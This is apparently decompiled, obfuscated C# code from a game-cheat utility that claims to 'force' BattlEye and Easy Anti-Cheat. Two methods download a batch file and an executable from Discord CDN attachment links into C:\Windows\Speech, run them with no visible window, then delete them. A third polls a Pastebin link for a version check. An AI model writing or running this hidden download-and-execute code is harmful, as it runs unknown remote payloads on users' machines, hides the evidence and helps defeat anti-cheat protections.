using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

internal class Class13
{
	public static void smethod_0()
	{
		_003CModule_003E.Class0.smethod_0();
		Console.WriteLine("Forcing Battle-Eye...");
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/704851400882126929/704852145996038184/force_be_.bat", "C:\\Windows\\Speech\\force_be_.bat");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Windows\\Speech\\force_be_.bat";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Windows\\Speech\\force_be_.bat");
		Thread.Sleep(9000);
		Console.WriteLine("Battle-Eye Force Complete!");
		Thread.Sleep(4000);
		Class17.smethod_3();
	}

	public static void smethod_1()
	{
		_003CModule_003E.Class0.smethod_0();
		Console.WriteLine("Forcing Easy-Anti-Cheat...");
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/704851400882126929/704852269572816896/EAC_Forcerbeta.exe", "C:\\Windows\\Speech\\EAC_Forcerbeta.exe");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Windows\\Speech\\EAC_Forcerbeta.exe";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Windows\\Speech\\EAC_Forcerbeta.exe");
		Thread.Sleep(9000);
		Console.WriteLine("Easy-Anti-Cheat Force Complete!");
		Thread.Sleep(4000);
		Class17.smethod_3();
	}

	public static void smethod_2()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		if (webClient.DownloadString("https://pastebin.com/raw/LkyXs9fL").Contains("v1.1.8"))
		{
			Console.ForegroundColor = ConsoleColor.Green;
		}
	}

	public Class13()
	{
		_003CModule_003E.Class0.smethod_0();
		base._002Ector();
	}
}
